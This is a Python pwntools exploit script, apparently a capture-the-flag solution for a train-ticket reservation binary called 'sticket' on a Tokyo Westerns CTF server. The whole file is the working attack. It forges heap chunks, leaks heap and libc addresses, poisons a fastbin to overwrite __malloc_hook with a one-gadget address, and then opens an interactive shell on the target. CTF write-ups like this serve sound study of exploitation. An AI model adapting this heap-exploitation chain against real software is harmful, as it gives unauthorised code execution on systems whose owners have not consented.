#!/usr/bin/python
from pwn import *
import sys

HOST = "pwn1.chal.ctf.westerns.tokyo"
PORT = 31729

def reserve(stationon, stationoff, carno, seatno, commlen, comment, nosendl=False):
	r.sendline("1")	
	r.sendlineafter("Station to get on >> ", stationon)
	r.sendlineafter("Station to get off >> ", stationoff)
	r.sendlineafter("Car number(1-16) >> ", carno)
	r.sendlineafter("Seat number(1-20) >> ", seatno)
	r.sendlineafter("Comment length >> ", commlen)

	if commlen != "0":
		if nosendl:
			r.sendafter("Comment >> ", comment)
		else:
			r.sendlineafter("Comment >> ", comment)
	
	r.recvuntil(">> ")

def confirm():
	r.sendline("2")
	data = r.recvuntil(">> ")
	return data

def cancel(id):
	r.sendline("3")
	r.sendlineafter(">> ", str(id))
	r.recvuntil(">> ")


def logout(payload, receiveAdditional = False):
	r.sendline("0")
	r.recvuntil(":")
	r.sendline(payload)
	r.recvuntil(">> ")

	if (receiveAdditional):
		r.recvuntil(":")
		r.sendline("A")
		r.recvuntil(">> ")


def exploit(r):

	log.info("Initial login (Create fake chunk in name")

	payload = "A"*8	
	payload += p64(0x21)
	payload += p64(0x0) + p64(0x0)	
	payload += p64(0x0)
	payload += p64(0x21)
	payload += p8(0)*(88-len(payload))
	payload += p64(0x602230)[:6]

	r.sendlineafter(":", payload)

	log.info("Relogin")
	r.sendlineafter(":", "AAAA")
	r.recvuntil(">> ")

	log.info("Leaking heap and libc addresses")

	reserve("01", "02", "03", "04", "20", "AAAABBBB")
	reserve("01", "02", "03", "04", "20", "AAAABBBB")
	
	cancel(2)
	cancel(1)
	
	reserve("01", "02", "03", "04", "0", "")	
	r.recvuntil(">> ")	
	
	LEAK = confirm()[110:]
	HEAPLEAK = u64(LEAK[:LEAK.index("\n")].ljust(8, "\x00"))

	log.info("HEAP leak         : %s" % hex(HEAPLEAK))

	logout("A")

	reserve("01", "02", "03", "04", "255", "AAAABBBB")
	reserve("01", "02", "03", "04", "255", "AAAABBBB")
	reserve("01", "02", "03", "04", "255", "AAAABBBB")
		
	cancel(2)

	reserve("01", "02", "03", "04", "0", "")
	r.recvuntil(">>")
	
	LEAK = u64(confirm()[213:213+6]+"\x00\x00")

	log.info("LIBC leak         : %s" % hex(LEAK))
	
	LIBC = LEAK - 0x3c4c78
	MALLOC_HOOK_TARGET = LEAK - 0x18b
	ONE = LIBC + 0x4526a

	log.info("LIBC base         : %s" % hex(LIBC))
	log.info("MALLOC hook chunk : %s" % hex(MALLOC_HOOK_TARGET))
	log.info("ONE gadget        : %s" % hex(ONE))

	log.info("Prepare fake chunk in name")

	payload = "A"*8	
	payload += p64(0x21)
	payload += p64(0x0) + p64(0x0)	
	payload += p64(HEAPLEAK + 0x1e0)	# points to fake comment chunk
	payload += p64(0x21)
	payload += p8(0)*(88-len(payload))
	payload += p64(0x602230)[:6]		# points to fake chunk in name

	logout(payload, True)

	log.info("Prepare fake chunk on heap")

	bigchunk  = p64(0x0) + p64(0x0)
	bigchunk += p64(0x0) + p64(0x0)
	bigchunk += p64(0x0) + p64(0x0)
	bigchunk += p64(0x0) + p64(0x71)	# Fake comment chunk
	bigchunk += p64(0x0) + p64(0x0)
	bigchunk += p8(0x0)*0x50
	bigchunk += p64(0) + p64(0x71)		# Fake next chunk

	reserve("33", "00", "03", "04", "200", bigchunk)

	log.info("Free fake chunk in name (puts name fake chunk and heap fake chunk into main_arena)")	

	cancel(0)

	log.info("Free chunk on heap and reallocate to overwrite fake heap chunk")

	cancel(1)	

	payload = "A"*48
	payload += p64(0x0)
	payload += p64(0x71)
	payload += p64(MALLOC_HOOK_TARGET)

	reserve("33", "00", "03", "04", "200", payload)

	log.info("Allocate chunk to get fake FD pointer into fastbin list")

	reserve("33", "00", "03", "04", "100", "AAAA")

	log.info("Allocate chunk to overwrite MALLOC HOOK")

	payload = p8(0)*19
	payload += p64(ONE)

	reserve("01", "02", "03", "04", "100", payload)	

	log.info("Call malloc to trigger shell")
	
	r.sendline("1")
	
	r.interactive()
	
	return

if __name__ == "__main__":
	if len(sys.argv) > 1:		
		r = remote(HOST, PORT)
		exploit(r)
	else:
		r = process("./sticket", env={"LD_PRELOAD" : "./libc.so.6"})		
		print util.proc.pidof(r)
		pause()
		exploit(r)
